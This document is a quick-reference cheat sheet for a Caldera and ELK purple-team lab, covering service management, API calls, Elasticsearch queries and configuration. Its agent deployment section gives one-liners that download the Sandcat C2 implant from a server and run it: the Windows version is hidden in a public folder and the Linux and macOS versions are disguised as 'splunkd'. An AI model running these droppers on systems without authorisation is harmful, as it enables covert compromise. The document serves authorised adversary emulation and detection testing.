# Quick Reference

## Command Cheat Sheet

### Startup and Shutdown

```bash
# Start full environment (ELK + Caldera)
./scripts/tl-startup.sh

# Start Caldera only
python3 server.py --insecure

# Start with debug logging
python3 server.py --insecure --log DEBUG

# Check system status
./scripts/tl-status.sh

# Graceful shutdown
./scripts/tl-shutdown.sh

# Force kill Caldera process
pkill -f "python.*server.py"
pkill -9 -f "python.*server.py"  # Force kill
```

### Service Management

```bash
# Elasticsearch
sudo systemctl start elasticsearch
sudo systemctl stop elasticsearch
sudo systemctl restart elasticsearch
sudo systemctl status elasticsearch

# Kibana
sudo systemctl start kibana
sudo systemctl stop kibana
sudo systemctl restart kibana
sudo systemctl status kibana

# Logstash
sudo systemctl start logstash
sudo systemctl stop logstash
sudo systemctl restart logstash
sudo systemctl status logstash

# Check service logs
sudo journalctl -u elasticsearch -n 50
sudo journalctl -u kibana -n 50
sudo journalctl -u logstash -n 50
```

### System Diagnostics

```bash
# Check available memory
free -h

# Check disk space
df -h

# Check CPU and process usage
top
htop

# Check port usage
sudo lsof -i :8888
sudo netstat -tulpn | grep 8888

# Check running processes
ps aux | grep server.py
ps aux | grep elasticsearch

# Monitor logs in real-time
tail -f logs/*.log
tail -f /var/log/elasticsearch/elasticsearch.log
tail -f /var/log/kibana/kibana.log

# Search logs for errors
tail -100 logs/*.log | grep -i error
grep -i "error\|exception\|traceback" logs/*.log
```

### Network Diagnostics

```bash
# Test connectivity to Caldera
curl http://localhost:8888/api/v2/health

# Test with verbose output
curl -v http://localhost:8888/api/v2/health

# Test Elasticsearch connectivity
curl http://localhost:9200/_cluster/health
curl -u elastic:password http://192.168.1.50:9200/_cluster/health

# Test Kibana connectivity
curl http://localhost:5601/api/status

# Check network latency
ping <target-ip>

# Test port connectivity
nc -zv localhost 8888
nc -zv localhost 9200
nc -zv localhost 5601

# Monitor network traffic
sudo tcpdump -i any -A port 8888
```

## API Quick Reference

### Authentication

```bash
# Using API key
curl -H "KEY: your-api-key-here" http://localhost:8888/api/v2/agents

# Using basic auth (after login via UI)
curl -b cookies.txt http://localhost:8888/api/v2/agents
```

### Health and Status

```bash
# Check Caldera health
curl -H "KEY: your-api-key" http://localhost:8888/api/v2/health

# Check orchestrator status
curl http://localhost:8888/plugin/orchestrator/status | python3 -m json.tool
```

### Agents

```bash
# List all agents
curl -H "KEY: your-api-key" http://localhost:8888/api/v2/agents

# Get specific agent
curl -H "KEY: your-api-key" http://localhost:8888/api/v2/agents/<PAW>

# Delete agent
curl -X DELETE -H "KEY: your-api-key" \
  http://localhost:8888/api/v2/agents/<PAW>

# Update agent sleep interval
curl -X PATCH -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{"sleep_min": 30, "sleep_max": 60}' \
  http://localhost:8888/api/v2/agents/<PAW>
```

### Operations

```bash
# List all operations
curl -H "KEY: your-api-key" http://localhost:8888/api/v2/operations

# Get specific operation
curl -H "KEY: your-api-key" \
  http://localhost:8888/api/v2/operations/<OP_ID>

# Create operation
curl -X POST -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "PURPLE-TEST-001",
    "adversary": {"adversary_id": "<ADVERSARY_ID>"},
    "planner": {"id": "atomic"},
    "group": "red",
    "auto_close": false
  }' \
  http://localhost:8888/api/v2/operations

# Start operation
curl -X PATCH -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{"state": "running"}' \
  http://localhost:8888/api/v2/operations/<OP_ID>

# Pause operation
curl -X PATCH -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{"state": "paused"}' \
  http://localhost:8888/api/v2/operations/<OP_ID>

# Get operation links (executed abilities)
curl -H "KEY: your-api-key" \
  http://localhost:8888/api/v2/operations/<OP_ID>/links

# Get operation report
curl -H "KEY: your-api-key" \
  http://localhost:8888/api/v2/operations/<OP_ID>/report
```

### Abilities

```bash
# List all abilities
curl -H "KEY: your-api-key" http://localhost:8888/api/v2/abilities

# Get specific ability
curl -H "KEY: your-api-key" \
  http://localhost:8888/api/v2/abilities/<ABILITY_ID>

# Filter abilities by platform
curl -H "KEY: your-api-key" \
  "http://localhost:8888/api/v2/abilities?platform=windows"

# Filter abilities by technique
curl -H "KEY: your-api-key" \
  "http://localhost:8888/api/v2/abilities?technique=T1033"
```

### Adversaries

```bash
# List all adversaries
curl -H "KEY: your-api-key" http://localhost:8888/api/v2/adversaries

# Get specific adversary
curl -H "KEY: your-api-key" \
  http://localhost:8888/api/v2/adversaries/<ADVERSARY_ID>

# Create adversary
curl -X POST -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Custom Adversary",
    "description": "Custom adversary profile",
    "atomic_ordering": ["T1033", "T1049", "T1082"]
  }' \
  http://localhost:8888/api/v2/adversaries
```

### Reports

```bash
# Generate PDF report
curl -X POST -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{
    "operation_id": "<OP_ID>",
    "format": "pdf",
    "include_facts": true
  }' \
  http://localhost:8888/api/v2/reports \
  --output report.pdf

# Generate JSON report
curl -X POST -H "KEY: your-api-key" \
  -H "Content-Type: application/json" \
  -d '{
    "operation_id": "<OP_ID>",
    "format": "json"
  }' \
  http://localhost:8888/api/v2/reports
```

## Elasticsearch API Quick Reference

### Cluster Management

```bash
# Check cluster health
curl -u elastic:password http://localhost:9200/_cluster/health?pretty

# List all indices
curl -u elastic:password http://localhost:9200/_cat/indices?v

# Get cluster stats
curl -u elastic:password http://localhost:9200/_cluster/stats?pretty

# Check node info
curl -u elastic:password http://localhost:9200/_cat/nodes?v
```

### Index Operations

```bash
# Create index
curl -u elastic:password -X PUT http://localhost:9200/purple-team-logs

# Delete index
curl -u elastic:password -X DELETE http://localhost:9200/purple-team-logs

# Get index mapping
curl -u elastic:password \
  http://localhost:9200/winlogbeat-*/_mapping?pretty

# Get index settings
curl -u elastic:password \
  http://localhost:9200/winlogbeat-*/_settings?pretty
```

### Search Operations

```bash
# Search for purple team tags
curl -X GET -u elastic:password \
  "http://localhost:9200/winlogbeat-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "term": { "tags": "purple_team" }
    },
    "size": 10
  }'

# Search by operation ID
curl -X GET -u elastic:password \
  "http://localhost:9200/winlogbeat-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "term": { "purple.operation_id": "<OP_ID>" }
    }
  }'

# Search by technique
curl -X GET -u elastic:password \
  "http://localhost:9200/winlogbeat-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "term": { "purple.technique": "T1033" }
    }
  }'

# Count purple team events
curl -X GET -u elastic:password \
  "http://localhost:9200/winlogbeat-*/_count" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "term": { "tags": "purple_team" }
    }
  }'
```

## Configuration File Locations

### Caldera Configuration

```
conf/default.yml         # Default configuration (do not modify)
conf/local.yml           # Local overrides
.env.elk                 # ELK integration credentials (optional)
```

### ELK Stack Configuration

```
/etc/elasticsearch/elasticsearch.yml        # Elasticsearch config
/etc/elasticsearch/jvm.options             # JVM heap settings
/etc/kibana/kibana.yml                     # Kibana config
/etc/logstash/logstash.yml                 # Logstash config
/etc/logstash/pipelines.yml                # Logstash pipelines
/etc/logstash/conf.d/                      # Pipeline configurations
```

### Plugin Configuration

```
plugins/<plugin-name>/hook.py             # Plugin hook implementation
plugins/<plugin-name>/conf.yml            # Plugin configuration
plugins/<plugin-name>/data/               # Plugin data storage
```

## Log File Locations

### Caldera Logs

```
logs/*.log                                 # Caldera application logs
/tmp/tl-startup.log                       # Startup script logs
/tmp/tl-shutdown.log                      # Shutdown script logs
plugins/orchestrator/data/fallback_logs/  # ELK fallback logs
```

### ELK Stack Logs

```
/var/log/elasticsearch/                   # Elasticsearch logs
/var/log/kibana/                          # Kibana logs
/var/log/logstash/                        # Logstash logs
```

### System Logs

```
/var/log/syslog                           # System log (Debian/Ubuntu)
/var/log/messages                         # System log (RHEL/CentOS)
sudo journalctl -u <service-name>         # Systemd service logs
```

## Port Reference

### Default Ports

| Service | Port | Protocol | Description |
|---------|------|----------|-------------|
| Caldera Web UI | 8888 | HTTP | Web interface and API |
| Caldera SSL | 8443 | HTTPS | Secure web interface (if configured) |
| Elasticsearch | 9200 | HTTP | REST API |
| Elasticsearch Transport | 9300 | TCP | Node communication |
| Kibana | 5601 | HTTP | Web interface |
| Logstash | 5044 | TCP | Beats input |
| WebSocket Contact | 8080 | WS | Agent websocket contact |
| TCP Contact | 7010 | TCP | Agent TCP contact |
| UDP Contact | 7011 | UDP | Agent UDP contact |

### Firewall Configuration

```bash
# Allow Caldera web interface
sudo ufw allow 8888/tcp

# Allow Elasticsearch (if remote access needed)
sudo ufw allow 9200/tcp

# Allow Kibana (if remote access needed)
sudo ufw allow 5601/tcp

# Allow agent contacts
sudo ufw allow 8080/tcp  # WebSocket
sudo ufw allow 7010/tcp  # TCP contact
sudo ufw allow 7011/udp  # UDP contact

# Check firewall status
sudo ufw status verbose
```

## File Path Reference

### Data Directories

```
data/abilities/          # Ability definitions (YAML)
data/adversaries/        # Adversary profiles (YAML)
data/objectives/         # Operation objectives (YAML)
data/sources/            # Fact sources (YAML)
data/payloads/           # Payload files
data/results/            # Operation results (JSON)
data/object_store        # Serialised object database
data/fact_store          # Fact database
```

### Plugin Directories

```
plugins/atomic/          # Atomic Red Team integration
plugins/branding/        # UI customisation
plugins/debrief/         # Operation analytics
plugins/debrief-elk-detections/  # ELK detection correlation
plugins/magma/           # Frontend UI (Vue.js)
plugins/orchestrator/    # Workflow automation
plugins/reporting/       # Report generation
plugins/sandcat/         # Agent implementation
plugins/stockpile/       # Ability repository
```

### Application Directories

```
app/api/                 # REST API handlers
app/contacts/            # Agent communication protocols
app/objects/             # Core data models
app/planners/            # Operation planning algorithms
app/service/             # Business logic services
app/utility/             # Utility functions
```

## Environment Variables

### Caldera Environment

```bash
# Python virtual environment
source venv/bin/activate

# Verify activation
echo $VIRTUAL_ENV
```

### ELK Integration

```bash
# Set ELK credentials
export ELK_URL="http://192.168.1.50:9200"
export ELK_USER="elastic"
export ELK_PASS="your-password-here"
export ELK_INDEX="winlogbeat-*"

# Or source from file
echo 'export ELK_URL="http://192.168.1.50:9200"' > .env.elk
echo 'export ELK_USER="elastic"' >> .env.elk
echo 'export ELK_PASS="your-password"' >> .env.elk
echo 'export ELK_INDEX="winlogbeat-*"' >> .env.elk

source .env.elk
```

### Verify Environment

```bash
# Check ELK configuration
echo "ELK_URL: $ELK_URL"
echo "ELK_USER: $ELK_USER"
echo "ELK_PASS: ${ELK_PASS:+CONFIGURED}"
echo "ELK_INDEX: $ELK_INDEX"
```

## Common Configuration Snippets

### Minimal conf/local.yml

```yaml
host: 0.0.0.0
port: 8888

users:
  admin:
    password: change-me-immediately

api_key_red: your-red-api-key
api_key_blue: your-blue-api-key

plugins:
  - magma
  - sandcat
  - stockpile
  - orchestrator
  - reporting
```

### Production conf/local.yml

```yaml
host: 0.0.0.0
port: 8888
ssl_port: 8443
ssl_cert: /path/to/cert.pem
ssl_key: /path/to/key.pem

users:
  admin:
    password: strong-password-16-chars-min

api_key_red: randomised-api-key-red
api_key_blue: randomised-api-key-blue

plugins:
  - atomic
  - branding
  - debrief
  - debrief-elk-detections
  - magma
  - orchestrator
  - reporting
  - sandcat
  - stockpile

operation:
  planner: atomic
  jitter: 2/8
  obfuscation: plain-text
  autonomous: true

logging:
  level: INFO
```

### Orchestrator Plugin Configuration

```yaml
plugins:
  orchestrator:
    elk_url: "http://192.168.1.50:9200"
    elk_user: "elastic"
    elk_pass: "your-password"
    elk_index: "winlogbeat-*"
    circuit_breaker_threshold: 5
    circuit_breaker_timeout: 300
```

## Agent Deployment Commands

### Windows (PowerShell)

```powershell
# Basic deployment
$server="http://192.168.1.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go-windows");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
Get-Process | ? {$_.Path -like "*$name*"} | Stop-Process -Force -ErrorAction SilentlyContinue;
rm -force "C:\Users\Public\$name" -ErrorAction SilentlyContinue;
[io.file]::WriteAllBytes("C:\Users\Public\$name",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name -ArgumentList "-server $server -group red" -WindowStyle Hidden;
```

### Linux

```bash
# Basic deployment
server="http://192.168.1.100:8888";
curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

### macOS

```bash
# Basic deployment
server="http://192.168.1.100:8888";
curl -s -X POST -H "file:sandcat.go-darwin" -H "platform:darwin" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

## Quick Troubleshooting Commands

### Check Everything

```bash
# Quick health check
./scripts/tl-status.sh

# Detailed diagnostics
free -h && df -h && \
curl -s http://localhost:8888/api/v2/health | python3 -m json.tool && \
curl -s http://localhost:8888/plugin/orchestrator/status | python3 -m json.tool
```

### Fix Common Issues

```bash
# Server won't start (port conflict)
pkill -f "python.*server.py"
python3 server.py --insecure

# Agent not appearing (firewall)
sudo ufw allow 8888/tcp

# UI stuck loading (clear cache and rebuild)
cd plugins/magma && npm install && npm run build && cd ../..
# Then clear browser cache (Ctrl+Shift+Delete)

# Low memory (clean and restart)
rm -rf data/results/*
./scripts/tl-shutdown.sh && sleep 10 && ./scripts/tl-startup.sh

# ELK not tagging (check credentials)
source .env.elk
python3 server.py --insecure
```

### Collect Diagnostic Information

```bash
# Create diagnostic bundle
tar czf diagnostic-$(date +%Y%m%d-%H%M%S).tar.gz \
  logs/*.log \
  conf/local.yml \
  /tmp/tl-*.log \
  plugins/orchestrator/data/fallback_logs/ \
  --exclude="*.pyc" \
  --exclude="__pycache__"

# System information
uname -a > sysinfo.txt
python3 --version >> sysinfo.txt
free -h >> sysinfo.txt
df -h >> sysinfo.txt
```

## Keyboard Shortcuts

### Browser UI

| Action | Shortcut |
|--------|----------|
| Hard reload | Ctrl+Shift+R (Chrome/Edge) |
| Hard reload | Ctrl+F5 (Firefox) |
| Open dev tools | F12 |
| Clear cache | Ctrl+Shift+Delete |

### Terminal

| Action | Shortcut |
|--------|----------|
| Stop process | Ctrl+C |
| Background process | Ctrl+Z, then `bg` |
| Clear screen | Ctrl+L or `clear` |
| Search history | Ctrl+R |
| End of line | Ctrl+E |
| Start of line | Ctrl+A |

## See Also

### Documentation

- [FAQ](faq.md) - Frequently asked questions
- [Troubleshooting Index](troubleshooting.md) - Common issues and solutions
- [Installation Guide](../getting-started/installation.md)
- [Configuration Guide](../getting-started/configuration.md)
- [API Reference](../technical/api-reference.md)

### Detailed Guides

- [Agent Deployment](../user-guide/agents.md)
- [Running Operations](../user-guide/operations.md)
- [ELK Integration](../deployment/elk-integration.md)
- [Deployment Troubleshooting](../deployment/troubleshooting.md)
- [Orchestrator Troubleshooting](../plugins/orchestrator-troubleshooting.md)

## Quick Start Reminder

```bash
# 1. Start the platform
./scripts/tl-startup.sh

# 2. Check status
./scripts/tl-status.sh

# 3. Access web interface
# Open browser: http://localhost:8888
# Login: admin / admin (change immediately)

# 4. Deploy agents
# Navigate to: Campaigns → Agents → Click to Deploy

# 5. Create and run operation
# Navigate to: Campaigns → Operations → Create Operation

# 6. View results
# Navigate to: Campaigns → Operations → Select operation → View results

# 7. Generate report
# Select completed operation → Generate Report

# 8. Graceful shutdown
./scripts/tl-shutdown.sh
```
